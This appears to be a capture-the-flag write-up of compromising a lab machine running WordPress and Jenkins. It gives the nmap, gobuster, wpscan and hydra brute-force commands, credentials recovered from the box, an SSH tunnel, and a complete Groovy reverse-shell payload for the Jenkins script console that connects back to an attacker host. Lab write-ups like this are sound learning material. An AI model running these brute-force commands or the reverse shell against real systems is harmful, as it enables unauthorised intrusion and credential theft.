## Enumeration
```bash
nmap -p- 10.10.188.101 
```

``` bash
nmap -A -sC 10.10.188.101
```

Found port 22 & 80

```bash
gobuster dir -u http://10.10.188.101:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 50
```

Found :
```text
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/blog                 (Status: 301) [Size: 313] [--> http://10.10.188.101/blog/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.188.101/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.188.101/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.188.101/wordpress/]
```

![[Pasted image 20221116152508.png]]
No CVE found for this version

```bash
wpscan --url http://10.10.188.101/blog
```

Can't access : 
http://internal.thm/blog/wp-login.php
Add internal.thm to etc hosts and then log back it's working.

I found 1 author on the site "admin"

to clear etc hosts  : sudo sed -i '$d' /etc/hosts

## Exploit

I tested some usernames and noticed that there is an indication in the error message that the admin password is not good. When bad username indication that username is bad. 
Let's brute force wp login for admin.

```bash
hydra 10.10.188.101 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:Error" -P /usr/share/wordlists/rockyou.txt -l admin -I -V
```

![[Pasted image 20221116160042.png]]

Alternatively : 
```bash
wpscan --url http://internal.thm/blog --usernames admin -P /usr/share/wordlists/rockyou.txt --max-threads 50
```

Now I am in the dashboard :
![[Pasted image 20221116160602.png]]

Let's go to include a reverse shell by editing a theme then start deamon :
```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![[Pasted image 20221116161438.png]]


mysql -uphpmyadmin -pB2Ud4fEOZmVq phpmyadmin

found :

$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123



found : 

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080

```
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

Then bruteforce jenkins :
```bash
hydra 127.0.0.1 -s 8081 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt  -I -V
```


then login in jenkins

```
String host="10.8.12.51";
int port=4488;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 
```

Put that reverse shell in script console.

![[Pasted image 20221116174729.png]]